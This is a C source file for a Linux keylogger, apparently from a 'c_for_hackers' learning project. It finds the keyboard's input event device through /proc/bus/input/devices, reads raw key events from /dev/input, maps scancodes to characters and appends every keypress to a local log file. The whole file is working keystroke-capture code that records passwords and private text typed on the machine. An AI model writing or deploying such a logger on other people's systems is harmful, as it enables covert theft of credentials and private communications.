#include "logger.h"

const char *key_map(unsigned int code)
{
    switch (code)
    {
    case 1:
        return "ESC";
    case 2:
        return "1";
    case 3:
        return "2";
    case 4:
        return "3";
    case 5:
        return "4";
    case 6:
        return "5";
    case 7:
        return "6";
    case 8:
        return "7";
    case 9:
        return "8";
    case 10:
        return "9";
    case 11:
        return "0";
    case 12:
        return "-";
    case 13:
        return "=";
    case 14:
        return "\b"; // BACKSPACE
    case 15:
        return "\t"; // TAB
    case 16:
        return "q";
    case 17:
        return "w";
    case 18:
        return "e";
    case 19:
        return "r";
    case 20:
        return "t";
    case 21:
        return "y";
    case 22:
        return "u";
    case 23:
        return "i";
    case 24:
        return "o";
    case 25:
        return "p";
    case 26:
        return "[";
    case 27:
        return "]";
    case 28:
        return "\n"; // ENTER
    case 29:
        return ""; // LEFTCTRL
    case 30:
        return "a";
    case 31:
        return "s";
    case 32:
        return "d";
    case 33:
        return "f";
    case 34:
        return "g";
    case 35:
        return "h";
    case 36:
        return "j";
    case 37:
        return "k";
    case 38:
        return "l";
    case 39:
        return ";";
    case 40:
        return "'";
    case 41:
        return "`";
    case 42:
        return ""; // LEFTSHIFT
    case 43:
        return "\\";
    case 44:
        return "z";
    case 45:
        return "x";
    case 46:
        return "c";
    case 47:
        return "v";
    case 48:
        return "b";
    case 49:
        return "n";
    case 50:
        return "m";
    case 51:
        return ",";
    case 52:
        return ".";
    case 53:
        return "/";
    case 54:
        return ""; // RIGHTSHIFT
    case 55:
        return "*";
    case 56:
        return ""; // LEFTALT
    case 57:
        return " "; // SPACE
    case 58:
        return ""; // CAPSLOCK
    case 59:
        return ""; // F1
    case 60:
        return ""; // F2
    case 61:
        return ""; // F3
    case 62:
        return ""; // F4
    case 63:
        return ""; // F5
    case 64:
        return ""; // F6
    case 65:
        return ""; // F7
    case 66:
        return ""; // F8
    case 67:
        return ""; // F9
    case 68:
        return ""; // F10
    case 69:
        return ""; // NUMLOCK
    case 70:
        return ""; // SCROLLLOCK
    case 71:
        return "7";
    case 72:
        return "8";
    case 73:
        return "9";
    case 74:
        return "-";
    case 75:
        return "4";
    case 76:
        return "5";
    case 77:
        return "6";
    case 78:
        return "+";
    case 79:
        return "1";
    case 80:
        return "2";
    case 81:
        return "3";
    case 82:
        return "0";
    case 83:
        return ".";
    // All other keys return empty string or "UNKNOWN"
    default:
        return "";
    }
}

void get_handler(char *pdevice, char *phandler, int verbose)
{

    char device[MAX_SIZE] = "";
    char handler[MAX_SIZE] = "";
    char line[MAX_SIZE];

    const char *target_keyboards[] = {
        "AT Translated Set 2 keyboard",
        "Standard PS/2 Keyboard",
        "USB Keyboard",
        "Keyboard"};

    FILE *fptr = fopen("/proc/bus/input/devices", "r");
    if (!fptr)
    {
        perror("Fail to open the file");
        exit(EXIT_FAILURE);
    }

    while (fgets(line, sizeof(line), fptr))
    {
        if (line[0] == 'N' && strstr(line, "Name="))
        {
            strncpy(device, line, MAX_SIZE);
        }

        if (line[0] == 'H' && strstr(line, "Handlers="))
        {
            strncpy(handler, line, MAX_SIZE);
            for (int i = 0; i < sizeof(target_keyboards) / sizeof(target_keyboards[0]); i++)
            {
                if (strstr(device, target_keyboards[i]))
                {
                    char *token = strtok(handler, " ");
                    while (token)
                    {
                        if (strncmp(token, "event", 5) == 0)
                        {
                            strncpy(pdevice, target_keyboards[i], MAX_SIZE - 1);
                            snprintf(phandler, MAX_SIZE - 1, "/dev/input/%s", token);
                            fclose(fptr);
                            return;
                        }
                        token = strtok(NULL, " ");
                    }
                }
            }
            strcpy(device, "");
            strcpy(handler, "");
        }
    }

    fclose(fptr);
    fprintf(stderr, "❌ Could not find the real keyboard handler.\n");
    return;
}

void connect_handler(char *handler, int verbose)
{
    int fd;
    struct input_event ev;
    ssize_t bytes_read;
    fd = open(handler, O_RDONLY);

    if (fd == -1)
    {
        perror("Error : fail to open the file");
        close(fd);
        exit(EXIT_FAILURE);
    }

    FILE *log_fp = fopen("/home/sanjay/Desktop/c_for_hackers/keytrace/logs/keytrace.txt", "a+");
    if (!log_fp)
    {
        perror("fail to open the log file");
        exit(EXIT_FAILURE);
    }
    if (verbose)
    {
        printf("Listening for keyboard events at [%s]\n to exit press CTRL + C\n", handler);
    }
    while (1)
    {
        bytes_read = read(fd, &ev, sizeof(ev));

        if (bytes_read == -1)
        {
            if (errno == EINTR)
            {
                continue;
            }
            else
            {
                perror("Error fail to read the input device");
                close(fd);
                exit(EXIT_FAILURE);
            }
        }
        if (bytes_read == sizeof(ev))
        {
            if (ev.type == EV_KEY)
            {
                const char *key = key_map(ev.code);
                if (ev.value == 1)
                {
                    fprintf(log_fp, "%s", key);
                    fflush(log_fp);
                    if (verbose)
                        printf("%s", key);
                }
            }
        }
    }
    close(fd);
    return;
}